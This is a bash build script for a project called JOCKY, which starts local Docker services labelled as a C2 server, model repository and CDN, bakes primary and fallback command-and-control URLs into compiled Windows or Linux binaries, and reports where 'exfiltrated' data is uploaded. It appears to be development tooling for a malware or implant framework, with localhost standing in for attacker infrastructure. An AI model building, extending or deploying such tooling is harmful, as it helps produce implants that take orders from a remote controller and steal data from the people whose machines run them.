#!/bin/bash
# JOCKY Local Development Build Script
# Starts Docker services and builds with local configuration
# Usage: ./build_local.sh <source.jky> <output_dir> [--platform linux|windows]

set -e

SOURCE_FILE="$1"
OUTPUT_DIR="$2"
PLATFORM="${3:-windows}"

if [ "$3" == "--platform" ] && [ -n "$4" ]; then
    PLATFORM="$4"
fi

if [ -z "$SOURCE_FILE" ] || [ -z "$OUTPUT_DIR" ]; then
    echo "Usage: $0 <source.jky> <output_dir> [--platform linux|windows]"
    echo ""
    echo "This script:"
    echo "  1. Starts local Docker services (C2, Model Repo, CDN)"
    echo "  2. Waits for services to be ready"
    echo "  3. Sets environment variables to point to localhost"
    echo "  4. Compiles with build_with_config.sh"
    echo "  5. Shows where to find the binary and logs"
    echo ""
    echo "Example:"
    echo "  $0 examples/research_chain_linux_production.jky build/local --platform linux"
    exit 1
fi

echo "=================================================="
echo "JOCKY Local Development Build"
echo "=================================================="
echo ""

# Check if Docker is running
if ! docker info > /dev/null 2>&1; then
    echo "❌ Docker is not running!"
    echo "   Start Docker and try again: docker daemon"
    exit 1
fi

echo "[*] Starting local Docker services..."
docker-compose -f docker-compose.dev.yml up -d --quiet-pull

echo "[*] Waiting for services to be ready..."
sleep 3

# Check if C2 is responding
echo "[*] Verifying C2 server..."
for i in {1..10}; do
    if curl -s http://localhost:5000/api/status > /dev/null 2>&1; then
        echo "    [+] C2 server is online"
        break
    fi
    if [ $i -eq 10 ]; then
        echo "    [-] C2 server failed to start!"
        docker-compose -f docker-compose.dev.yml logs c2-server
        exit 1
    fi
    sleep 1
done

echo "[*] Verifying Model Repository..."
for i in {1..10}; do
    if curl -s http://localhost:5001/ > /dev/null 2>&1; then
        echo "    [+] Model repository is online"
        break
    fi
    if [ $i -eq 10 ]; then
        echo "    [-] Model repository failed to start!"
        docker-compose -f docker-compose.dev.yml logs model-repo
        exit 1
    fi
    sleep 1
done

echo "[*] Verifying CDN endpoint..."
for i in {1..10}; do
    if curl -s http://localhost:5080/ > /dev/null 2>&1; then
        echo "    [+] CDN endpoint is online"
        break
    fi
    if [ $i -eq 10 ]; then
        echo "    [-] CDN endpoint failed to start!"
        docker-compose -f docker-compose.dev.yml logs cdn-endpoint
        exit 1
    fi
    sleep 1
done

echo ""
echo "[*] Setting up environment variables for local development..."

# Set environment variables pointing to local Docker services
export JOCKY_C2_PRIMARY="http://localhost:5000/api/config"
export JOCKY_C2_FALLBACK="http://localhost:5000/api/config"
export JOCKY_MODEL_REPO="http://localhost:5001/models/"
export JOCKY_BUILD_ID="local_dev_$(date +%s)"

echo "    [+] JOCKY_C2_PRIMARY=http://localhost:5000/api/config"
echo "    [+] JOCKY_C2_FALLBACK=http://localhost:5000/api/config"
echo "    [+] JOCKY_MODEL_REPO=http://localhost:5001/models/"
echo "    [+] JOCKY_BUILD_ID=$JOCKY_BUILD_ID"
echo ""

# Create output directory
mkdir -p "$OUTPUT_DIR"

echo "[*] Building with local configuration..."
echo ""

# Run the actual build with these environment variables
python3 "$(dirname "$0")/compile_pipeline.py" \
    "$SOURCE_FILE" \
    "$OUTPUT_DIR" \
    --platform "$PLATFORM"

echo ""
echo "[+] Build complete!"
echo ""
echo "=================================================="
echo "Local Development Setup Running"
echo "=================================================="
echo ""
echo "📍 Services:"
echo "   C2 Server:        http://localhost:5000"
echo "   Model Repository: http://localhost:5001"
echo "   CDN Endpoint:     http://localhost:5080"
echo ""
echo "📦 Binary Location:"
BINARY_NAME=$(basename "${SOURCE_FILE%.*}")
if [ "$PLATFORM" == "windows" ]; then
    echo "   $OUTPUT_DIR/${BINARY_NAME}.exe"
else
    echo "   $OUTPUT_DIR/$BINARY_NAME"
fi
echo ""
echo "📋 Configuration Baked In:"
echo "   C2 Primary:   $JOCKY_C2_PRIMARY"
echo "   C2 Fallback:  $JOCKY_C2_FALLBACK"
echo "   Model Repo:   $JOCKY_MODEL_REPO"
echo "   Build ID:     $JOCKY_BUILD_ID"
echo ""
echo "💾 Data Exfiltration:"
echo "   Uploaded data will appear in: ./build/uploads/"
echo ""
echo "🔍 View logs:"
echo "   C2 Server:  docker-compose -f docker-compose.dev.yml logs c2-server"
echo "   Models:     docker-compose -f docker-compose.dev.yml logs model-repo"
echo "   CDN:        docker-compose -f docker-compose.dev.yml logs cdn-endpoint"
echo ""
echo "🛑 Stop services:"
echo "   docker-compose -f docker-compose.dev.yml down"
echo ""
echo "=================================================="
